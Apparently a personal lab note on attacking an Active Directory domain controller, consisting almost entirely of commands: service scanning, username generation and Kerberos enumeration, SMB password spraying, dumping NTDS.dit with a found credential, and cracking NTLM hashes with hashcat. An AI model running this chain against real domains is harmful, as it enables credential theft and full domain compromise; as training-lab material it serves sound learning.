# [[Attacking Active Directory and NTDS.dit]]

`nmap -sV 10.129.202.85`
![[Screenshot 2026-05-09 at 17.44.44.png]]

```shell
nano names.txt
sudo ./username-anarchy/username-anarchy -i ./names.txt >> names_expanded.txt
```
![[Screenshot 2026-05-09 at 17.50.19.png]]

```shell
./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local names_expanded.txt
```
![[Screenshot 2026-05-09 at 17.55.34.png]]

```shell
netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```
![[Screenshot 2026-05-09 at 18.07.04.png]]

```shell
netxec smb 10.129.80.238 -u jmarston -p P@ssword! -M ntdsutil
```
![[Screenshot 2026-05-09 at 18.28.07.png]]

```shell
hashcat -a 0 -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```
![[Screenshot 2026-05-09 at 18.32.52.png]]

